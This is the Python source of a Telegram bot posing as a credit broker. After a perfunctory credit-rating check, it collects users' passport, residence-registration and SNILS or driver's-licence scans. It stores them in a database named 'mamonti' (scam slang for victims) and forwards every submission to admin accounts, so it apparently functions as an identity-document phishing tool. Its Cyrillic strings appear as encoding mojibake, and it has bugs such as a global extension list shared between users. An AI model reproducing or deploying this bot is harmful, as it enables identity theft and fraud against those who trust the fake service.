from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher.filters import Text
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import StatesGroup, State
import sqlite3
import base64
import time
import os
from dotenv import load_dotenv
from kb import *
import logging

logging.basicConfig(level=logging.INFO, filename="py_log.log", filemode="a",
                    format="%(asctime)s %(levelname)s %(message)s")
logging.debug("A DEBUG Message")
logging.info("An INFO")
logging.warning("A WARNING")
logging.error("An ERROR")
logging.critical("A message of CRITICAL severity")

load_dotenv()
ext_data = []
bot = Bot(os.getenv('TOKEN'))
admins = [str(x) for x in os.getenv('ADMIN_ID').split()]
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)
con = sqlite3.connect('mamonti.db')
cur = con.cursor()
cur.execute(
    'CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, tag INTEGER, name VARCHAR(10), passport BLOB NOT NULL, propiska BLOB NOT NULL, SecDoc BLOB NOT NULL, CreditRate VARCHAR(10), PhisOrUr VARCHAR(10), Summa VARCHAR(10))')
con.commit()


class UserState(StatesGroup):
    phisikurik = State()
    creditRate = State()
    Summa = State()
    passport = State()
    propiska = State()
    secDoc = State()


async def getInfo():
    cur.execute("SELECT * FROM users ORDER BY id DESC LIMIT 0,1;")
    result = cur.fetchall()
    if result:
        for admin_id in admins:
            await bot.send_message(text=
                                   f'–ü–æ–ª—É—á–µ–Ω–∞ –Ω–æ–≤–∞—è –∑–∞—è–≤–∫–∞ –æ—Ç {result[0][7][:-1]}–∞!\nid: {result[0][1]}\nusername: @{result[0][2]}\n–ö—Ä–µ–¥–∏—Ç–Ω—ã–π —Ä–µ–π—Ç–∏–Ω–≥: {result[0][6]}\n–°—É–º–º–∞: {result[0][8]}',
                                   chat_id=admin_id)
            await bot.send_message(text='–ü–∞—Å–ø–æ—Ä—Ç:', chat_id=admin_id)
            await bot.send_document(chat_id=admin_id,
                                    document=blob_to_pdf(blobik=result[0][3], extension=ext_data[0]))
            await bot.send_message(text='–ü—Ä–æ–ø–∏—Å–∫–∞:', chat_id=admin_id)
            await bot.send_document(chat_id=admin_id,
                                    document=blob_to_pdf(result[0][4], extension=ext_data[1]))
            await bot.send_message(text='–°–ù–ò–õ–°/–ü—Ä–∞–≤–∞:', chat_id=admin_id)
            await bot.send_document(chat_id=admin_id,
                                    document=blob_to_pdf(result[0][5], extension=ext_data[2]))


# –§—É–Ω–∫—Ü–∏–∏
def pdf_to_blob(document):
    with open(document, 'rb') as f:
        blob = base64.b64encode(f.read())
    return blob


def blob_to_pdf(blobik, extension):
    blob = blobik
    blob = base64.b64decode(blob)
    text_file = open(f'result.{extension}', 'wb')
    text_file.write(blob)
    return open(f'result.{extension}', 'rb')


def sql_request_send(user_id, username, passport, propiska, secdoc, creditrate, phisorur, summa):
    cur.execute(
        "INSERT OR IGNORE INTO users (tag, name, passport, propiska, SecDoc, CreditRate, PhisOrUr, Summa) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
        (user_id, username, passport, propiska, secdoc, creditrate, phisorur, summa))
    con.commit()


# def send_data():
#     time.sleep(10)
#     cur.execute("SELECT * from users")
#     records = cur.fetchall()
#     blobik = ''
#     for row in records:
#         blobik = row[2]
#     blob_to_pdf(blobik)


# –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –∫–æ–º–∞–Ω–¥
@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    markup = default_keyboard()
    # markup_admin = default_keyboard_admin()
    if str(message.from_user.id) in admins:
        await message.answer('–í—ã –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–ª–∏—Å—å –∫–∞–∫ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä', reply_markup=markup)
    else:
        await message.answer_sticker(f'{os.getenv("STICKER_WELCOME")}')
        await message.answer(f'{message.from_user.first_name}, –¥–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ –∫–æ–º–ø–∞–Ω–∏—é <b> —Ñ–∏–Ω–∞–Ω—Å–∏—Å—Ç </b> üí∞!',
                             reply_markup=markup, parse_mode='HTML')


@dp.message_handler(commands=['id'])
async def show_id(message: types.Message):
    markup = default_keyboard()
    await message.answer(f'–í–∞—à id:{message.from_user.id}', reply_markup=markup)


@dp.message_handler(commands=['admin'])
async def show_id(message: types.Message):
    markup = default_keyboard()
    # markup_admin = admin_keyboard()
    if message.from_user.id == int(os.getenv('ADMIN_ID')):
        await message.answer(f'–í–∞—à id:{message.from_user.id}', reply_markup=markup)
    else:
        await message.answer('–£ –≤–∞—Å –Ω–µ—Ç –ø—Ä–∞–≤ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞!', reply_markup=markup)


# –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏–π
@dp.message_handler(Text(equals="–û –Ω–∞—Å"))
async def callback_about_us(message: types.Message):
    await message.answer(
        f'–ú—ã –∑–∞–Ω–∏–º–∞–µ—Ç—Å—è –∫—Ä–µ–¥–∏—Ç–Ω—ã–º –±—Ä–æ–∫–µ—Ä—Å—Ç–≤–æ–º, –ø–æ–º–æ–≥–∞–µ–º –ø–æ–ª—É—á–∞—Ç—å –Ω–∞—à–∏–º –∫–ª–∏–µ–Ω—Ç–∞–º –Ω–∞ —Å—É–º–º—ã, '
        f'–ø—Ä–µ–≤—ã—à–∞—é—â–∏–µ –≤ –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ä–∞–∑ —Ç–µ, –∫–æ—Ç–æ—Ä—ã–µ –ø–æ–ª—É—á–∞—é—Ç –ª—é–¥–∏ –±–µ–∑ –Ω–∞—à–µ–π –ø–æ–º–æ—â–∏',
        parse_mode='HTML')


@dp.message_handler(Text(equals='–ù–∞—à —Å–∞–π—Ç'))
async def callback_site(message: types.Message):
    markup = types.InlineKeyboardMarkup().add(InL_button_site)
    await message.answer('–ü–æ –∫–Ω–æ–ø–∫–µ –Ω–∏–∂–µ –≤—ã –º–æ–∂–µ—Ç–µ –æ–∑–Ω–∞–∫–æ–º–∏—Ç—å—Å—è —Å –Ω–∞—à–∏–º —Å–∞–π—Ç–æ–º', reply_markup=markup)


@dp.message_handler(Text(equals="–ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å"))
async def callback_continue(message: types.Message):  # Changed function name to callback_continue
    await message.answer('–í—ã —Ñ–∏–∑. –∏–ª–∏ —é—Ä. –ª–∏—Ü–æ?', reply_markup=phis_or_ur_kb())
    await UserState.phisikurik.set()


@dp.message_handler(state=UserState.phisikurik)
async def PhisOrUrIns(message: types.Message, state: FSMContext):
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(button_KRateCheck)
    await state.update_data(pOU=message.text)
    await UserState.next()
    await message.answer('–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –∫—Ä–µ–¥–∏—Ç–Ω—ã–π —Ä–µ–π—Ç–∏–Ω–≥', reply_markup=credRatekb())


@dp.message_handler(state=UserState.creditRate)
async def creditRateIns(message: types.Message, state: FSMContext):
    try:
        int(message.text)
    except ValueError:
        await message.answer('–û—à–∏–±–∫–∞! –í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ')
    await state.update_data(CredRate=message.text)
    data = await state.get_data()
    if int(data['CredRate']) >= 450 and data['pOU'] == '–§–∏–∑. –ª–∏—Ü–æ' or int(data['CredRate']) >= 250 and data[
        'pOU'] == '–Æ—Ä. –ª–∏—Ü–æ':  # –∑–∞–º–µ–Ω–∏—Ç—å —á–∏—Å–ª–æ
        await message.answer('–í—ã —É—Å–ø–µ—à–Ω–æ –ø—Ä–æ—à–ª–∏ –ø—Ä–æ–≤–µ—Ä–∫—É –Ω–∞ –∫—Ä–µ–¥–∏—Ç–Ω—ã–π —Ä–µ–π—Ç–∏–Ω–≥!')
        await UserState.next()
        await message.answer('–í–≤–µ–¥–∏—Ç–µ –∂–µ–ª–∞–µ–º—É—é —Å—É–º–º—É', reply_markup=types.ReplyKeyboardRemove())
    else:
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –≤–∞—à –∫—Ä–µ–¥–∏—Ç–Ω—ã–π —Ä–µ–π—Ç–∏–Ω–≥ —Å–ª–∏—à–∫–æ–º –º–∞–ª. –û–±—Ä–∞—Ç–∏—Ç–µ—Å—å –∫ –Ω–∞–º –ø–æ–∑–∂–µ',
                             reply_markup=types.ReplyKeyboardRemove())
        await state.finish()


@dp.message_handler(state=UserState.Summa)
async def summIns(message: types.Message, state: FSMContext):
    data = await state.get_data()
    logging.info(f"ask for summa")
    try:
        int(message.text)
        logging.info(f"Success summa")
    except ValueError:
        await message.answer('–û—à–∏–±–∫–∞! –í–≤–µ–¥–∏—Ç–µ —á–∏—Å–ª–æ–≤–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ')
        logging.error("Fucked by summa ValueError", exc_info=True)
    await state.update_data(summa=message.text)
    await message.answer('–ó–∞–ø–∏—Å–∞–ª–∏ —Å—É–º–º—É')
    await message.answer('–û—Ç–ø—Ä–∞–≤—å—Ç–µ –¥–æ–∫—É–º–µ–Ω—Ç –∏–ª–∏ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏—é –ø–∞—Å–ø–æ—Ä—Ç–∞')
    await UserState.next()


@dp.message_handler(state=UserState.passport, content_types=['document'])
async def PhotoPas(message: types.Message, state: FSMContext):
    logging.info(f"ask for passport")
    try:
        await bot.get_file(message.document.file_id)
        logging.info(f"Success passport")
    except:
        await message.answer('–û—à–∏–±–∫–∞! –ó–∞–≥—Ä—É–∑–∏—Ç–µ —Ñ–∞–π–ª')
        logging.error("–Ω–µ –∑–∞–≥—Ä—É–∂–µ–Ω —Ñ–∞–π–ª", exc_info=True)
    file_info = await bot.get_file(message.document.file_id)
    file_path = file_info.file_path
    extension = file_path.split('.')[1]  # –ü–æ–ª—É—á–∞–µ—Ç —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è —Ñ–∞–π–ª–∞
    document = f'files/passport.{extension}'
    ext_data.append(extension)
    logging.info(f"ask for passport")
    try:
        if file_path.endswith('.pdf') or file_path.endswith('.jpeg') or file_path.endswith(
                '.heic') or file_path.endswith(
            '.png') \
                or file_path.endswith('.jpg') or file_path.endswith('.tiff') \
                or file_path.endswith('.bmp') or file_path.endswith('.webp'):
            await bot.download_file(file_path, document)
            await message.answer_sticker(f'{os.getenv("SEND_STICKER")}')
            # time.sleep(1) –Ω–∞–±—å—é —Å–µ–±–µ –Ω–µ —Å–ø–∞—Ç—å –Ω–∞ –≥–ª–∞–∑–∞–∞–∞–∞–∞—Ö
            # time.sleep(10) –ª—É—á—à–µ –Ω–µ —Å–ø–∞—Ç—å –∞ —Å–∏–ø–∞—Ç—å
            await state.update_data(passport=pdf_to_blob(document))
            await message.answer('–ü–∞—Å–ø–æ—Ä—Ç –ø–æ–ª—É—á–µ–Ω, —Ç–µ–ø–µ—Ä—å –Ω–∞–º –Ω—É–∂–Ω–æ —Ñ–æ—Ç–æ –≤–∞—à–µ–π –ø—Ä–æ–ø–∏—Å–∫–∏', reply_markup=next_keyboard())
            logging.info(f"Success passport")
    except:
        await message.reply('–ú–æ–∂–Ω–æ —Å–æ—Ö—Ä–∞–Ω—è—Ç—å —Ç–æ–ª—å–∫–æ PDF —Ñ–∞–π–ª—ã –∏ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–∏. –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –µ—â–µ —Ä–∞–∑',
                            reply_markup=next_keyboard())
        logging.error("Fucked by passport", exc_info=True)
    await UserState.next()


@dp.message_handler(state=UserState.passport, content_types=['photo'])
async def PhotoPas_photo(message: types.Message, state: FSMContext):
    await message.photo[-1].download('files/passport.jpg')
    document = f'files/passport.jpg'
    extension = 'jpg'
    ext_data.append(extension)
    await state.update_data(passport=pdf_to_blob(document))
    await message.answer_sticker(f'{os.getenv("SEND_STICKER")}')
    await message.answer(
        '–ü–∞—Å–ø–æ—Ä—Ç –ø–æ–ª—É—á–µ–Ω, —Ç–µ–ø–µ—Ä—å –Ω–∞–º –Ω—É–∂–Ω–æ —Ñ–æ—Ç–æ –≤–∞—à–µ–π –ø—Ä–æ–ø–∏—Å–∫–∏')
    await UserState.next()


@dp.message_handler(state=UserState.propiska, content_types=['document'])
async def PhotoProp(message: types.Message, state: FSMContext):
    file_info = await bot.get_file(message.document.file_id)
    file_path = file_info.file_path
    extension = file_path.split('.')[1]  # –ü–æ–ª—É—á–∞–µ—Ç —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è —Ñ–∞–π–ª–∞
    document = f'files/propiska.{extension}'
    ext_data.append(extension)
    logging.info(f"ask for propiska")
    try:
        if file_path.endswith('.pdf') or file_path.endswith('.jpeg') or file_path.endswith(
                '.heic') or file_path.endswith(
            '.png') \
                or file_path.endswith('.jpg') or file_path.endswith('.tiff') \
                or file_path.endswith('.bmp') or file_path.endswith('.webp'):
            await bot.download_file(file_path, document)
            await message.answer_sticker(f'{os.getenv("SEND_STICKER")}')
            # time.sleep(1) –Ω–∞–±—å—é —Å–µ–±–µ –Ω–µ —Å–ø–∞—Ç—å –Ω–∞ –≥–ª–∞–∑–∞–∞–∞–∞–∞—Ö
            # time.sleep(10) –ª—É—á—à–µ –Ω–µ —Å–ø–∞—Ç—å –∞ —Å–∏–ø–∞—Ç—å
            await state.update_data(propiska=pdf_to_blob(document))
            await message.answer('–ü—Ä–∏–Ω—è–ª–∏ –≤–∞—à—É –ø—Ä–æ–ø–∏—Å–∫—É, —Ç–µ–ø–µ—Ä—å –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –°–ù–ò–õ–° –∏–ª–∏ –≤–æ–¥–∏—Ç–µ–ª—å–∫–æ–µ —É–¥–æ—Å—Ç–æ–≤–µ—Ä–µ–Ω–∏–µ')
            logging.info("Succes propiska")
    except:
        await message.reply('–ú–æ–∂–Ω–æ —Å–æ—Ö—Ä–∞–Ω—è—Ç—å —Ç–æ–ª—å–∫–æ PDF —Ñ–∞–π–ª—ã –∏ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–∏. –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –µ—â–µ —Ä–∞–∑')
        logging.error("Fucked by propiska", exc_info=True)
    await UserState.next()


@dp.message_handler(state=UserState.propiska, content_types=['photo'])
async def PhotoProp_photo(message: types.Message, state: FSMContext):
    await message.photo[-1].download('files/propiska.jpg')
    document = f'files/propiska.jpg'
    extension = 'jpg'
    ext_data.append(extension)
    await state.update_data(propiska=pdf_to_blob(document))
    await message.answer_sticker(f'{os.getenv("SEND_STICKER")}')
    await message.answer(
        '–ü—Ä–æ–ø–∏—Å–∫–∞ –ø–æ–ª—É—á–µ–Ω–∞, —Ç–µ–ø–µ—Ä—å –Ω—É–∂–µ–Ω –°–ù–ò–õ–° –∏–ª–∏ –í–æ–¥–∏—Ç–µ–ª—å—Å–∫–æ–µ —É–¥–æ—Å—Ç–æ–≤–µ—Ä–µ–Ω–∏–µ')
    await UserState.next()


@dp.message_handler(state=UserState.secDoc, content_types=['document'])
async def SecDoc(message: types.Message, state: FSMContext):
    file_info = await bot.get_file(message.document.file_id)
    file_path = file_info.file_path
    extension = file_path.split('.')[1]  # –ü–æ–ª—É—á–∞–µ—Ç —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è —Ñ–∞–π–ª–∞
    document = f'files/secdoc.{extension}'
    ext_data.append(extension)
    logging.info(f'ask for secdoc')
    try:
        if file_path.endswith('.pdf') or file_path.endswith('.jpeg') or file_path.endswith(
                '.heic') or file_path.endswith(
            '.png') \
                or file_path.endswith('.jpg') or file_path.endswith('.tiff') \
                or file_path.endswith('.bmp') or file_path.endswith('.webp'):
            await bot.download_file(file_path, document)
            await message.answer_sticker(f'{os.getenv("SEND_STICKER")}')
            # time.sleep(1) –Ω–∞–±—å—é —Å–µ–±–µ –Ω–µ —Å–ø–∞—Ç—å –Ω–∞ –≥–ª–∞–∑–∞–∞–∞–∞–∞—Ö
            # time.sleep(10) –ª—É—á—à–µ –Ω–µ —Å–ø–∞—Ç—å –∞ —Å–∏–ø–∞—Ç—å
            await state.update_data(secDoc=pdf_to_blob(document))
            await message.answer(
                '–í–∞—à–∞ –∑–∞—è–≤–∫–∞ –±—ã–ª–∞ –ø—Ä–∏–Ω—è—Ç–∞ –∏ –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∞ –Ω–∞—à–∏–º –º–µ–Ω–µ–¥–∂–µ—Ä–∞–º, –∫–æ—Ç–æ—Ä—ã–µ —Å –≤–∞–º–∏ —Å–≤—è–∂—É—Ç—Å—è. –î–æ —Å–∫–æ—Ä—ã—Ö –≤—Å—Ç—Ä–µ—á!')
            logging.info(f'Success secdoc')
    except:
        await message.reply('–ú–æ–∂–Ω–æ —Å–æ—Ö—Ä–∞–Ω—è—Ç—å —Ç–æ–ª—å–∫–æ PDF —Ñ–∞–π–ª—ã –∏ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏–∏. –ü–æ–≤—Ç–æ—Ä–∏—Ç–µ –µ—â–µ —Ä–∞–∑')
        logging.error("Fucked by secdoc", exc_info=True)
    data = await state.get_data()
    sql_request_send(message.from_user.id, message.from_user.username, data['passport'],
                     data['propiska'],
                     data['secDoc'], data['CredRate'], data['pOU'], data['summa'])
    await getInfo()
    await state.finish()


@dp.message_handler(state=UserState.secDoc, content_types=['photo'])
async def SecDoc_photo(message: types.Message, state: FSMContext):
    await message.photo[-1].download('files/secDoc.jpg')
    document = f'files/secDoc.jpg'
    extension = 'jpg'
    ext_data.append(extension)
    await state.update_data(secDoc=pdf_to_blob(document))
    await message.answer_sticker(f'{os.getenv("SEND_STICKER")}')
    await message.answer(
        '–í–∞—à–∞ –∑–∞—è–≤–∫–∞ –±—ã–ª–∞ –ø—Ä–∏–Ω—è—Ç–∞ –∏ –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∞ –Ω–∞—à–∏–º –º–µ–Ω–µ–¥–∂–µ—Ä–∞–º, –∫–æ—Ç–æ—Ä—ã–µ —Å –≤–∞–º–∏ —Å–≤—è–∂—É—Ç—Å—è. –î–æ —Å–∫–æ—Ä—ã—Ö –≤—Å—Ç—Ä–µ—á!')
    await UserState.next()
    data = await state.get_data()
    sql_request_send(message.from_user.id, message.from_user.username, data['passport'],
                     data['propiska'],
                     data['secDoc'], data['CredRate'], data['pOU'], data['summa'])
    await getInfo()
    await state.finish()


# @dp.message_handler()  # commands or content types as args
# async def start(message: types.Message):
#     markup = default_keyboard()
#     await message.answer(f'–ù–µ –ø–æ–Ω—è–ª –≤–∞—Å, {message.from_user.first_name}', reply_markup=markup)


if __name__ == '__main__':
    executor.start_polling(dp)
